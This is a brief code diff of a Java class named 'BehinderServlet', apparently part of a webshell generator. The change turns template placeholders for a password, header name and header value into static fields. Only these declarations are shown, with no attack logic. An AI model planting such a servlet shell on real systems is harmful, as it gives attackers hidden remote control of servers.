@@ -17,9 +17,9 @@ import java.util.Map;
  */
 public class BehinderServlet extends ClassLoader implements Servlet {
 
-    public String pass = "{{pass}}";
-    public String headerName = "{{headerName}}";
-    public String headerValue = "{{headerValue}}";
+    public static String pass;
+    public static String headerName;
+    public static String headerValue;
 
     @Override
     @SuppressWarnings("all")
